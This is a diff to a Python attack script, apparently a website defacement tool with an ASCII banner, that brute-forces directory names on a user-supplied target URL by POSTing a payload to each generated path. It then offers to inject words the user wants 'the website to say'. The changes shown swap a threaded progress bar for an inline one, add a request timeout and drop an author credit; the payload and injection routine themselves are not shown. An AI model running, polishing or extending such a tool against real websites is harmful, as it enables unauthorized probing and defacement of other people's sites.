@@ -1,5 +1,4 @@
 import os
-import threading
 import requests
 import string
 import itertools
@@ -14,7 +13,7 @@ def generate_combinations(min_length, max_length):
             yield ''.join(combination)
 
 def try_exploit(url, payload):
-    response = requests.post(url, data=payload)
+    response = requests.post(url, data=payload, timeout=2)
     return response.status_code == 200
 
 def inject_words(url, words):
@@ -29,27 +28,19 @@ def inject_words(url, words):
     total_combinations = sum(len(string.ascii_lowercase) ** i for i in range(min_length, max_length + 1))
     completed_combinations = 0
 
-    def update_loading_bar():
-        while True:
-            progress = (completed_combinations / total_combinations) * 100
-            loading_bar = f"{Fore.BLUE}[*]{Style.RESET_ALL} Progress: [{Fore.BLUE}{'=' * int(progress // 2)}{Style.RESET_ALL}{' ' * (50 - int(progress // 2))}] {progress:.1f}%"
-            print(loading_bar, end='\r')
-            if completed_combinations >= total_combinations:
-                break
-
-    loading_thread = threading.Thread(target=update_loading_bar)
-    loading_thread.start()
-
     for combination in generate_combinations(min_length, max_length):
         directory = ''.join(combination)
         exploit_url = url + directory
         if try_exploit(exploit_url, payload):
             directories.append(directory)
+
         completed_combinations += 1
+        if completed_combinations % 100 == 0:
+            progress = (completed_combinations / total_combinations) * 100
+            loading_bar = f"{Fore.BLUE}[*]{Style.RESET_ALL} Progress: [{Fore.BLUE}{'=' * int(progress // 2)}{Style.RESET_ALL}{' ' * (50 - int(progress // 2))}] {progress:.1f}%"
+            print(loading_bar, end='\r')
 
-    loading_thread.join()
     print()
-
     if directories:
         print(f"{Fore.BLUE}[*]{Style.RESET_ALL} Discovered directories: {directories}")
         answer = input("Do you want to continue and try injecting the words? [y/n]: ")
@@ -85,7 +76,6 @@ print()
 print(bcolors.OKCYAN + "┏┓┓ ┏┓┳┳┏┓┏┓")
 print(bcolors.OKCYAN + "┃┃┃ ┣┫┃┃┃┓┣ ")
 print(bcolors.OKCYAN + "┣┛┗┛┛┗┗┛┗┛┗┛")
-print("powered by enom")
 
 target_url = input("Enter the target URL: ")
 words = input("Enter the words you want the website to say: ")
